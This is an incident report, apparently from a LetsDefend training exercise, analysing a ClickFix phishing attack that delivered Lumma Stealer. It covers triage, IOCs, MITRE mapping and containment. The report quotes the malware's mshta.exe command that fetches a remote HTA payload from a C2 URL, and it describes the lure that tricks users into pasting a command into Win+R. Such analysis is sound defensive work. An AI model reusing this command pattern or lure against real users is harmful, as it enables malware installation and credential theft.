# SOC338 - Lumma Stealer DLL Side-Loading via ClickFix Phishing - Incident Report

**Analyst:** Stevan Mrkšić · **Platform:** LetsDefend · **Alert:** SOC338 · **EventID:** 316 · **Date:** 2025-03-13

| Field | Value |
|---|---|
| Alert name | SOC338 - Lumma Stealer - DLL Side-Loading via Click Fix Phishing |
| Severity | Critical |
| Category | Data Leakage |
| Recipient | dylan@letsdefend.io |
| Victim host | Dylan · 172.16.20.151 |
| Sender (spoofed) | update@windows-update[.]site |
| SMTP relay | 132.232.40[.]201 |
| Email subject | "Upgrade your system to Windows 11 Pro for FREE" |
| Device action | Allowed (email delivered to inbox) |
| Alert trigger reason | Redirected site contains a click fix type script for Lumma Stealer distribution |
| Alert time | 2025-03-13 09:44 AM |

---

## 1. Alert summary

A phishing email spoofing Microsoft was delivered to Dylan's inbox and not blocked by the email security gateway. The email linked to a fake Windows 11 upgrade page at hxxps://www[.]windows-update[.]site/ which used the ClickFix social engineering technique - instructing the user to press Win+R, Ctrl+V, and Enter to "verify" their system, silently executing a PowerShell command that had been injected into the clipboard by the phishing page. This launched `mshta.exe` to fetch and execute a remote HTA payload from a C2 server hosting Lumma Stealer. C2 connection was confirmed. Credentials and browser session data are presumed compromised.

---

## 2. Triage questions

**What is ClickFix?** ClickFix is a social engineering technique where a phishing page instructs the user to manually execute a malicious command through legitimate Windows UI (Win+R → Run dialog). The page pre-loads a PowerShell or mshta command into the clipboard; the user pastes and runs it themselves. This bypasses email attachment scanning, browser download protections, and Mark-of-the-Web because no file is downloaded - the user types the execution path directly into a trusted Windows dialog.

**Is this phishing or a false positive?** True positive. The sending domain `windows-update.site` has no affiliation with Microsoft. VirusTotal scored the URL 11/97 malicious (phishing/fraud). Any.run sandbox simulation confirmed ClickFix behaviour: the page prompts the user through Win+R → paste → Enter to execute a command. The mshta.exe C2 beacon was confirmed in endpoint process history and network logs.

**Was the email delivered?** Yes. Device action is `Allowed`. SMTP raw log confirms delivery: `update@windows-update.site → dylan@letsdefend.io`, action Allowed.

**Did Dylan interact with the link?** Yes. The proxy log confirms Dylan's browser (chrome.exe, Firefox/122.0 UA, referrer: https://mail.letsdefend.io/) loaded the phishing URL at 11:26 PM with HTTP 200 OK.

**Did the malware execute and reach C2?** Yes. `mshta.exe` executed at 23:26:20 with the C2 URL as its argument, and network action logs show a confirmed connection to 172.67.139[.]19 at the same timestamp.

---

## 3. Investigation

**3.1 Phishing email analysis**

The email arrived at 09:44 AM from `update@windows-update[.]site` via SMTP relay 132.232.40[.]201. The domain is a typosquatted lookalike of a legitimate-sounding Microsoft update service - `windows-update.site` vs `windowsupdate.microsoft.com`. The email content included urgency language ("Hurry", "This offer expires soon") and a countdown timer - standard pressure tactics to override the recipient's caution.

**Phishing page:** hxxps://www[.]windows-update[.]site/
- Rendered as a convincing Microsoft Windows 11 Pro marketing page with Microsoft branding and a 4-day countdown timer.
- VirusTotal: **11/97 malicious** (phishing/fraud; flagged by BitDefender, ESET, Fortinet, Kaspersky, Sophos, SOCRadar, Webroot among others).
- Any.run sandbox: Confirmed ClickFix behaviour - page displays "Step 1: Press and hold the Windows Key + R / Step 2: In the verification window, press Ctrl+V / Step 3: Press Enter on your keyboard to finish." A Run dialog box appears in the simulation, showing the clipboard-injected command ready to execute.

**3.2 User interaction confirmed**

Proxy log at 11:26 PM:

```
URL: https://windows-update.site/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0
Referrer: https://mail.letsdefend.io/
HTTP Status: 200 OK
Process Name: chrome.exe
```

Dylan opened the phishing link from webmail. HTTP 200 OK confirms the full phishing page loaded and the ClickFix clipboard injection ran in-browser.

**3.3 ClickFix execution - mshta.exe as LOLBin**

At **23:26:20**, the following process was created:

```
Process:   C:\Windows\System32\mshta.exe  (PID 7284)
Parent:    C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe
Command:   "C:\Windows\System32\mshta.exe" https://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4
User:      EC2AMAZ-ILGVOIN\LetsDefend
```

`mshta.exe` (Microsoft HTML Application Host) is a signed Windows binary used here as a Living-off-the-Land binary (LOLBin) to proxy execution of a remote payload. The URL is disguised with a `.mp4` extension but is actually an HTA (HTML Application) file - a format that `mshta.exe` executes as code. PowerShell acted as the launcher, with the terminal history showing three PowerShell commands firing in rapid succession at 23:26:19–23:26:32, including a hidden-window invocation (`-w 1`).

**3.4 C2 connection confirmed**

Immediately after mshta.exe executed, network action logs show Dylan's host beaconing to the confirmed C2 IP **172.67.139[.]19** (highlighted in the log), which resolves to `overcoatpassably[.]shop`, the same domain as the mshta.exe URL argument. This is the Lumma Stealer C2 beacon. Additional connections to 132.232.40[.]201, 142.250.190[.]35, 34.104.35[.]123, and 172.31.12[.]250 were observed in the same window - consistent with multi-stage C2 check-in behavior.

**3.5 Note on DLL side-loading**

The alert title names DLL side-loading as the execution mechanism. Lumma Stealer is known to deploy via a legitimate signed application that loads a malicious DLL from the same directory (side-loading). The mshta.exe stage fetches the initial payload from C2; the subsequent DLL side-loading occurs as part of that payload's execution and is consistent with Lumma Stealer's documented delivery chain.

---

## 4. IOCs

| Indicator | Type | Notes |
|---|---|---|
| 132.232.40[.]201 | IPv4 / SMTP relay | Phishing email origin |
| update@windows-update[.]site | Email sender | Spoofed Microsoft-lookalike domain |
| hxxps://www[.]windows-update[.]site/ | URL | Phishing / ClickFix page - VT 11/97 malicious |
| hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4 | URL | C2 - mshta.exe payload (disguised as .mp4) |
| 172.67.139[.]19 | IPv4 | C2 IP - overcoatpassably[.]shop |
| 172.16.20.151 | IPv4 | Victim - Dylan |
| dylan@letsdefend.io | Email | Recipient - phishing target |

---

## 5. MITRE ATT&CK

| Tactic | Technique | Notes |
|---|---|---|
| Initial Access | T1566.002 - Phishing: Spearphishing Link | Email to Dylan with malicious URL *(PDF lists T1566 - T1566.002 is more specific: link, not attachment)* |
| Execution | T1204.001 - User Execution: Malicious Link | Dylan clicked the link and followed ClickFix instructions *(PDF lists T1204 - T1204.001 is more specific)* |
| Execution | T1218.005 - Signed Binary Proxy Execution: Mshta | mshta.exe used as LOLBin to execute HTA payload from C2 *(not in PDF - added; this is the core ClickFix execution mechanism and is entirely absent from the PDF's MITRE table)* |
| Execution | T1059.001 - Command and Scripting Interpreter: PowerShell | PowerShell -w 1 used to invoke mshta.exe with hidden window *(PDF lists T1059 - T1059.001 more specific)* |
| Command & Control | T1071.001 - Application Layer Protocol: Web Protocols | C2 beacon over HTTPS to overcoatpassably[.]shop *(not in PDF - added)* |
| Credential Access | T1539 - Steal Web Session Cookie | Lumma Stealer harvests browser session tokens and cookies *(not in PDF - added; the PDF notes "user credentials compromised" but maps no credential-access technique)* |
| Discovery | T1087.001 - Account Discovery: Local Account | Post-execution reconnaissance *(PDF lists T1087 - T1087.001 more specific)* |
| Discovery | T1007 - System Service Discovery | System enumeration post-execution |

**Note:** T1218.005 (Mshta) is the technical mechanism that makes ClickFix work - it converts a clipboard-injected command into the execution of a remote HTA payload using a Windows-signed binary. Its absence from the PDF's MITRE table leaves the most analytically distinctive part of the kill chain unmapped.

---

## 6. Timeline

| Time | Event |
|---|---|
| 09:44 AM | Phishing email delivered to dylan@letsdefend.io - Device action: Allowed |
| 09:44 AM | SOC338 alert fires |
| 11:26 PM | Dylan visits hxxps://www[.]windows-update[.]site/ via Chrome from webmail (HTTP 200 OK) - ClickFix page loads, clipboard injected with malicious command |
| 23:26:19 | PowerShell -w 1 (hidden window) executes - ClickFix command runs |
| 23:26:20 | **mshta.exe (PID 7284) executes**: fetches HTA payload from hxxps://overcoatpassably[.]shop/Z8UZbPyVpGfdRS/maloy.mp4 |
| 23:26:20 | C2 connection to 172.67.139[.]19 confirmed in network action log |
| 23:26:31 | Additional PowerShell activity - further malicious commands |
| 23:26:32 | Further PowerShell activity |

---

## 7. Verdict

**True Positive - ClickFix phishing delivered, user interacted, Lumma Stealer C2 reached.**

**Severity confirmed: Critical.** The full attack chain executed successfully: phishing email bypassed email security (Device action: Allowed), the user was socially engineered into running a clipboard-injected command via ClickFix, `mshta.exe` fetched and executed a remote HTA payload, and the Lumma Stealer C2 beacon connected. Lumma Stealer's primary function is credential and session token theft from browsers - all stored passwords, session cookies, and potentially cryptocurrency wallets on the host must be treated as compromised.

The gap that made this possible: the email security gateway passed the email without scanning the link's destination. A tool that resolves URLs in emails and checks their content before delivery would have caught this at the first step.

---

## 8. Containment & escalation

**Immediate:**
- Isolate Dylan's host (172.16.20.151) from the network immediately.
- Delete the phishing email from Dylan's mailbox (Email Security tab → Delete).
- Block 132.232.40[.]201, 172.67.139[.]19, and all domains/IPs associated with the C2 at the perimeter firewall and proxy.
- Search all other hosts for connections to `windows-update[.]site` and `overcoatpassably[.]shop` - this phishing campaign may have targeted other users.

**Credential reset:**
- Force-reset all of Dylan's credentials: domain account, browser-saved passwords (treat every stored password as stolen), email, and any SaaS applications the browser had active sessions for. Lumma Stealer exfiltrates session cookies, which allow account takeover without needing the password.
- Invalidate all active web sessions for Dylan's accounts across cloud services.

**Escalation:** Escalate to Tier 2 / IR. Lumma Stealer exfiltration likely already occurred at the point the C2 beacon connected. The scope of stolen credentials and session tokens needs to be determined before full remediation can be assessed.

**Hardening:**
- Configure the email security gateway to follow and scan links at delivery time - the phishing domain was flagged 11/97 on VirusTotal, which the gateway would have caught if it had checked the URL's destination.
- Implement DMARC, DKIM, and SPF for all internal domains to prevent spoofing of legitimate sender addresses.
- Block `mshta.exe` from making outbound network connections via Windows Defender Attack Surface Reduction (ASR) rules. Restrict mshta.exe via AppLocker or WDAC for user workstations - there are very few legitimate business reasons for mshta.exe to fetch a remote URL.
- Conduct a ClickFix awareness session with users - the technique is increasingly common and the social engineering is convincing. Users should know that no legitimate website will ask them to press Win+R.

---

*Report part of LetsDefend SOC Analyst L2 portfolio. Analyst: Stevan Mrkšić | GitHub: slim92code*
